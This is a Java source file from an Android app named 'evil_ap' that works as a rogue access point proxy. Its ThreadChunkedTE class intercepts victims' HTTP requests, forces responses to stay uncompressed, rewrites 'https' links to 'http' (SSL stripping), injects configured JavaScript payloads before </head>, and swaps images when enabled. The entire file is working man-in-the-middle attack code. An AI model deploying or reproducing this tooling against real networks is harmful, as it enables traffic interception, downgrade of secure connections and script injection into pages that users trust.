package com.nibiru.evil_ap.proxy;

import android.content.SharedPreferences;
import android.util.Log;

import com.nibiru.evil_ap.ConfigTags;
import com.nibiru.evil_ap.SharedClass;
import com.nibiru.evil_ap.log.Client;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.Socket;
import java.util.List;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

/**
 * Created by Nibiru on 2016-12-23.
 */

public class ThreadChunkedTE implements Runnable {
    /**************************************CLASS FIELDS********************************************/
    protected final String TAG = getClass().getSimpleName();
    private Socket sClient;
    private Client c;
    private OkHttpParser rp;
    private OkHttpClient okhttp;
    private SharedPreferences mConfig;
    private SharedClass mSharedObj;
    private boolean debug = true;
    private boolean keep_alive;
    /**************************************CLASS METHODS*******************************************/
    ThreadChunkedTE(Socket sClient, SharedPreferences config, SharedClass sharedObj) {
        this.sClient = sClient;
        rp = new OkHttpParser();
        //make client not follow redirects!
        okhttp = new OkHttpClient().newBuilder().followRedirects(false).followSslRedirects(false)
                .build();
        mConfig = config;
        mSharedObj = sharedObj;
        c = mSharedObj.getClientByIp(sClient.getInetAddress().toString().substring(1));
        keep_alive = true;
    }
    @Override
    public void run() {
        //things we will eventually close
        BufferedReader inFromClient = null;
        OutputStream outToClient = null;
        Response res = null;
        while (keep_alive) {
            res = null;
            try {
                inFromClient = new BufferedReader(new InputStreamReader(sClient.getInputStream()));
                outToClient = sClient.getOutputStream();

                //get client request string
                String sRequest = getRequestString(inFromClient);
                if (sRequest == null) {
                    return;
                }

                //check if we are in keep alive connection
                keep_alive = sRequest.contains("keep-alive");

                //parse string request into okhttp request (remove some security headers)
                Request req = rp.parse(sRequest, mSharedObj, c);
                if (req == null) {
                    return;
                }

                //make request and get response
                res = okhttp.newCall(req).execute();

                //check what we are sending back
                String contentType = res.header("Content-Type");
                //prepare response
                byte[] bytesBody = res.body().bytes();

                //EDIT RESPONSE HERE
                boolean sslStrip = mConfig.getBoolean(ConfigTags.sslStrip.toString(), false);
                boolean jsInject = mConfig.getBoolean(ConfigTags.jsInject.toString(), false);
                if (sslStrip || jsInject)
                    bytesBody = editBytes(bytesBody, sslStrip, jsInject);
                //prepare response headers
                String headers = getResponseHeaders(res, getEtag(sRequest));
                headers = headers.replaceAll("\\n", "\r\n");
                sendHeaders(headers, outToClient);

                //if we are sending back image and imgReplace is on then swap img bytes
                if (contentType != null && contentType.contains("image")
                        && mConfig.getBoolean(ConfigTags.imgReplace.toString(), false)) {
                    sendImgChunks(outToClient);
                } else {
                    sendChunkToOutStream(bytesBody, outToClient);
                }
                //send end chunk
                sendChunkToOutStream("".getBytes(),outToClient);
                //debug headers
                if (debug) Log.d(TAG + "[OUT]", headers);

            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        //clean up when we are done
        if (res != null) res.body().close();
        try {
            if (outToClient != null) outToClient.close();
            if (sClient != null) sClient.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void sendImgChunks(OutputStream out) {
        /*byte[] reply;
        int byte_idx = 0;
        int len = mSharedObj.getImgDataLength();
        while (byte_idx <= len){
            reply = mSharedObj.getImgChunk(byte_idx, byte_idx+8192);
            sendChunkToOutStream(reply, out);
            byte_idx += 8192;
        }
        if (debug) Log.d(TAG + "[OUT]", "sent img body!");*/
        byte[] img = mSharedObj.getImgData();
        sendChunkToOutStream(img, out);
    }

    private byte[] editBytes(byte[] bytesBody, Boolean sslStrip, Boolean jsInject) {
        try {
            String response = new String(bytesBody, "UTF-8");
            if (sslStrip) {
                response = response.replaceAll("https", "http");
            }
            if (jsInject){
                List<String> payloads = mSharedObj.getPayloads();
                String full = "";
                for(String p: payloads){
                    full += p;
                }
                response = response.replaceAll("</head>", full + "</head>");
            }
            return response.getBytes();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
            return null;
        }
    }

    // convert InputStream to String
    private static String getStringFromInputStream(InputStream is) {

        BufferedReader br = null;
        StringBuilder sb = new StringBuilder();

        String line;
        try {

            br = new BufferedReader(new InputStreamReader(is));
            while ((line = br.readLine()) != null) {
                sb.append(line);
            }

        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (br != null) {
                try {
                    br.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

        return sb.toString();

    }

    private void sendChunkToOutStream(byte[] msg, OutputStream out){
        String chunk = Integer.toHexString(msg.length);
        byte[] delim = "\r\n".getBytes();
        byte[] chunkArr = new byte[chunk.length()+2+msg.length+2];
        // create chunk byte array
        System.arraycopy(chunk.getBytes(), 0, chunkArr, 0, chunk.length()); //hex len
        System.arraycopy(delim, 0, chunkArr, chunk.length(), delim.length); // /r/n
        System.arraycopy(msg, 0, chunkArr, chunk.length()+delim.length, msg.length); // msg
        System.arraycopy(delim, 0, chunkArr, chunk.length()+delim.length+msg.length, delim.length);
        try {
            out.write(chunkArr, 0, chunkArr.length);
            out.flush();
        } catch (IOException e) {
            e.printStackTrace();
            keep_alive = false;
        }
        if (debug) Log.d(TAG + "[OUT]", "sent chunk!");
    }

    private void sendHeaders(String msg, OutputStream out){
        try {
            out.write(msg.getBytes(), 0, msg.length());
            out.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
        if (debug) Log.d(TAG + "[OUT]", "sent headers!");
    }

    private String getEtag(String sRequest){
        String result = "";
        if (sRequest.contains("\"")) {
            result = sRequest.substring(sRequest.indexOf("\"") + 1);
            result = result.substring(0, result.indexOf("\""));
        }
        return "\"" + result + "\"";
    }

    private String getResponseHeaders(Response res, String eTag) throws IOException {
        String resToClient = "";
        if (debug) Log.d(TAG, "<==================Sending response==================>");
        //find status line
        // /n ! not /r/n !
        switch (res.code()) {
            case 200: resToClient += "HTTP/1.1 200 OK\n"; break;
            case 204: resToClient += "HTTP/1.1 204 No Content\n"; break;
            case 301: resToClient += "HTTP/1.1 301 Moved Permanently\n"; break;
            case 302: resToClient += "HTTP/1.1 302 Found\n"; break;
            case 304: resToClient += "HTTP/1.1 304 Not Modified\n"; break;
            case 403: resToClient += "HTTP/1.1 403 Forbidden\n"; break;
            case 404: resToClient += "HTTP/1.1 404 Not Found\n"; break;
            default: Log.e(TAG, "UNKNOWN STATUS CODE = " + res.code());
        }
        //send headers
        resToClient += res.headers().toString() + "\n";

        //workaround for 304's not working
        if (resToClient.startsWith("HTTP/1.1 304")) {
            resToClient = resToClient.replace("Connection: keep-alive", "Connection: close");
            resToClient = resToClient.replaceAll("ETag:.*", "ETag: " + eTag);
        }
        return resToClient;
    }

    private String getRequestString(BufferedReader in) throws IOException {
        String request = "";
        String body = "";
        String line;
        int length = 0;
        //read string request until there are no lines to read
        while ((line = in.readLine()) != null) {
            //last line of request message header is a blank line (\r\n\r\n)
            if (line.isEmpty()) {
                break;
            }
            //TODO: implement POST
            if (line.startsWith("POST")) {
                Log.e(TAG, "DROPPED POST REQUEST!");
                return null;
            }
            if (line.startsWith("Content-Length")) { //get the content-length
                int index = line.indexOf(':') + 1;
                String len = line.substring(index).trim();
                length = Integer.parseInt(len);
            }
            //make sure content is not zipped...
            //by not including the Accept-Encoding header
            if (!line.startsWith("Accept-Encoding")) {
                /*Log.d(TAG + "[IN]", "Accept-Encoding: identity");
                request += "Accept-Encoding: identity\r\n";*/
                if (debug) Log.d(TAG + "[IN]", line);
                request += line + "\r\n";
            }
        }
        // if there is Message body, go in to this loop
        if (length > 0) {
            int read;
            while ((read = in.read()) != -1) {
                body += ((char) read);
                if (body.length() == length) break;
            }
        }
        request += body; // adding the body to request
        return request;
    }

}
